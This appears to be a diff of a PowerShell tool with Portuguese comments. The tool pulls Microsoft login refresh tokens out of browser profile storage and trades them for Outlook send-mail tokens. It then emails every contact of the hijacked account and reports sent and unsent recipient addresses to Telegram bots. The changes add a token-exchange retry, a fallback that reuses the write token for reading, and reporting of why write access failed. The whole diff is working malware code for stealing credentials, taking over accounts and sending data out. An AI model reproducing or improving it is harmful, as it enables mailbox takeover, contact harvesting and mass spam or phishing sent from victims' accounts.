@@ -662,10 +662,10 @@ function Build-ReportText($out) {
 }
 
 # Bot de lista: a cada execucao (cliente/remetente), envia ao SEGUNDO bot o
-# email do remetente + todos os emails enviados + os que falharam por limite
-# excedido (HTTP 429 ErrorExceededMessageLimit), p/ o usuario montar a lista
-# de destinatarios por remetente.
-function Build-ListaText([string]$remetente, [array]$enviados, [array]$falhaLimite) {
+# email do remetente + todos os emails enviados + os que NAO foram enviados
+# (falhas e os que a trava de limite impediu de tentar), p/ o usuario montar a
+# lista de destinatarios por remetente.
+function Build-ListaText([string]$remetente, [array]$enviados, [array]$naoEnviados) {
     $L = @()
     $L += "📋 LISTA — remetente: $remetente"
     if ($enviados.Count -gt 0) {
@@ -673,10 +673,10 @@ function Build-ListaText([string]$remetente, [array]$enviados, [array]$falhaLimi
         $L += "✅ Enviados ($($enviados.Count)):"
         foreach ($e in $enviados) { $L += "  $e" }
     }
-    if ($falhaLimite.Count -gt 0) {
+    if ($naoEnviados.Count -gt 0) {
         $L += ""
-        $L += "⏸️ Falha por limite excedido ($($falhaLimite.Count)):"
-        foreach ($e in $falhaLimite) { $L += "  $e" }
+        $L += "❌ Não enviados ($($naoEnviados.Count)):"
+        foreach ($e in $naoEnviados) { $L += "  $e" }
     }
     return ($L -join "`n")
 }
@@ -1030,6 +1030,9 @@ function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]
         write_client = $writeClient
         exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
         exchange_hint  = if ($msal -and -not $readTok) { Get-ExchangeErrorHint $script:LastExchangeError } else { $null }
+        # Falha da troca do token WRITE (Mail.Send): leitura OK mas escrita falhou.
+        # Diferente de exchange_error (que e da troca de LEITURA). P/ o "por que".
+        write_exchange_error = if ($msal -and $readTok -and -not $writeTok) { $script:LastExchangeError } else { $null }
     }
 }
 
@@ -1083,6 +1086,13 @@ if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) 
 $comWrite = @($validos | Where-Object { $_.token_write })
 if ($comWrite.Count -gt 0) {
     $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
+} elseif ($validos.Count -gt 0) {
+    # Leitura OK mas NENHUM perfil conseguiu o token WRITE: anexar o MOTIVO
+    # (AADSTS65001 client invalido, throttle, rede) p/ o cliente ver no Telegram.
+    $semWrite = @($validos | Where-Object { $_.write_exchange_error })
+    if ($semWrite.Count -gt 0) {
+        $decisao += " | WRITE FALHOU: " + (Get-ExchangeErrorHint $semWrite[0].write_exchange_error)
+    }
 }
 
 # ---- modo -SendTo ----
@@ -1123,6 +1133,25 @@ if ($SendTo) {
 $envioTodos = $null
 if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) {
     $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
+    # RETRY do token de escrita (mesmo padrao do -SendTo): nenhum perfil em
+    # $validos tem token_write+token_read -> tenta trocar o refresh MSAL de novo
+    # (o refresh pode ter rotacionado desde a analise). O fallback de token_read
+    # e necessario quando $cand vem de $vivos (LOGADO_SESSAO_VIVA, sem token_read
+    # validado): o token write ja validou via /me, entao serve p/ listar.
+    if (-not $src) {
+        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
+        if ($cand) {
+            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
+            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
+            if ($wtObj) {
+                $cand.token_write  = $wtObj.token
+                $cand.write_client = $wtObj.mailClient
+                if (-not $cand.token_read) { $cand.token_read = $wtObj.token }  # write token valida via /me; serve p/ listar
+                if (-not $cand.conta)    { $cand.conta = $wtObj.email }         # $vivos nao tem conta validada; o write token valida via /me
+                $src = $cand
+            }
+        }
+    }
     $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAll" }
     $body    = if ($Body)    { $Body }    else { "Mensagem de teste (PowerShell)" }
     if ($src) {
@@ -1166,9 +1195,10 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
                 }
                 Start-Sleep -Milliseconds 300
             }
-            # bot de lista: emails que falharam por erro fatal (429 limite excedido
-            # OU 403 conta suspensa) — vao junto com os enviados ao 2o bot.
-            $falhaLimite = @($falhas | Where-Object { ($_.status -eq 429 -and $_.erro -match "ErrorExceededMessageLimit") -or ($_.status -eq 403 -and $_.erro -match "ErrorAccountSuspend") } | ForEach-Object { $_.email })
+            # bot de lista: TODOS os destinatarios que NAO estao em $enviados —
+            # inclui os que falharam e os que a trava de limite impediu de tentar.
+            # Vao junto com os enviados ao 2o bot.
+            $naoEnviados = @($contatos | Where-Object { $enviados -notcontains $_.email } | ForEach-Object { $_.email })
             $envioTodos = [PSCustomObject]@{
                 de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
                 perfil = "$($src.navegador)/$($src.perfil)"
@@ -1182,8 +1212,8 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             # enviados + falhas por limite. Independente de -NoTelegram (que so
             # desliga o reporte principal). Chunking em blocos <= 4000 chars evita
             # o limite de 4096 do Telegram quando a lista e grande.
-            if (($enviados.Count -gt 0) -or ($falhaLimite.Count -gt 0)) {
-                $listaText = Build-ListaText $src.conta $enviados $falhaLimite
+            if (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0)) {
+                $listaText = Build-ListaText $src.conta $enviados $naoEnviados
                 $listaRes = @()
                 if ($listaText.Length -le 4000) {
                     $listaRes += Send-TelegramMessage $ListaToken $ListaChatId $listaText
@@ -1202,7 +1232,17 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             }
         }
     } else {
-        $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
+        # Distinguir: ha perfil com token de LEITURA mas SEM escrita (Mail.Send)
+        # vs. NENHUM perfil com token valido. O status e renderizado direto no
+        # Telegram (Build-ReportText), entao o texto precisa ser claro p/ o usuario.
+        if ($validos.Count -gt 0) {
+            $st = "token de leitura válido, mas SEM token de escrita (Mail.Send) — nada enviado"
+            $de = $validos[0].conta
+        } else {
+            $st = "sem_perfil_com_token"
+            $de = $null
+        }
+        $envioTodos = [PSCustomObject]@{ de = $de; total = 0; enviados = 0; falhas = @(); status = $st }
     }
 }
 
